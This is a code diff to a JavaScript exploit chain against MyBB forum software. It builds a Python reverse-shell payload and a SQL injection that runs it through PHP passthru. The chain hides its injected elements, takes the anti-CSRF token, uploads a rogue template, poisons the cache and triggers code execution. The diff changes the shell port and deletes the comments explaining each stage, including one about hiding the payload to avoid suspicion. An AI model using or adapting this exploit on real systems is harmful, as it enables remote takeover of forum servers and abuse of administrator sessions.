@@ -1,5 +1,5 @@
 const REVERSE_SHELL_IP = "localhost";
-const REVERSE_SHELL_PORT = 5554;
+const REVERSE_SHELL_PORT = 7777;
 
 const PAYLOAD_XML_NAME = "payload";
 const PAYLOAD_XML_VERSION = "1821";
@@ -10,8 +10,7 @@ const SHELL_PAYLOAD = "python -c 'import socket,subprocess,os;s=socket.socket(so
 const SQL_PAYLOAD = "') AND 1=0 UNION SELECT title, '${passthru(base64_decode(\\'" + btoa(SHELL_PAYLOAD) + "\\'))}' from mybb_templates -- ";
 
 
-// Trigger the actual vulnerability, force cache reload.
-// Stage: Final
+
 function trigger() {
     var request = new XMLHttpRequest();
 
@@ -20,8 +19,7 @@ function trigger() {
 }
 
 
-// Poison the cache.
-// Stage: 6
+
 function set_as_default(token, tid) {
 
     var request = new XMLHttpRequest();
@@ -72,8 +70,7 @@ function get_payload_tid(token) {
 }
 
 
-// We pass the actual request to upload the template exploiting the second link of the exploit chain
-// Stage: 4
+
 function upload_template(token) {
 
     var request = new XMLHttpRequest();
@@ -102,8 +99,7 @@ function upload_template(token) {
 }
 
 
-// Build the rogue XML Template exploiting SQL Injection leading to RCE through PHP evaluation.
-// Stage: 3
+
 function build_payload() {
     var xmlDom = document.implementation.createDocument("", "", null);
     
@@ -129,8 +125,7 @@ function build_payload() {
 }
 
 
-// Acquire the anti-CSRF token 
-// Stage: 2
+
 function acquire_token(request) {
 
     var response = request.response;
@@ -141,13 +136,12 @@ function acquire_token(request) {
         return;
     }
 
-    // We have acquired the anti-CSRF token now.
+   
     upload_template(token);
 }
 
 
-// ACP Code Execution
-// Stage: 1
+
 function exec_acp() {
     
     var request = new XMLHttpRequest();
@@ -163,8 +157,7 @@ function exec_acp() {
 }
 
 
-// We hide the payload, to raise less suspicions
-// Stage: 0
+
 function hide() {
 
     var getAll = document.querySelectorAll("[src*='http://xyzsomething.com/image?)<a href=']");
@@ -175,7 +168,7 @@ function hide() {
     
 }
 
-// Entry point of the exploit
+
 function start() {
     hide();
     exec_acp();  
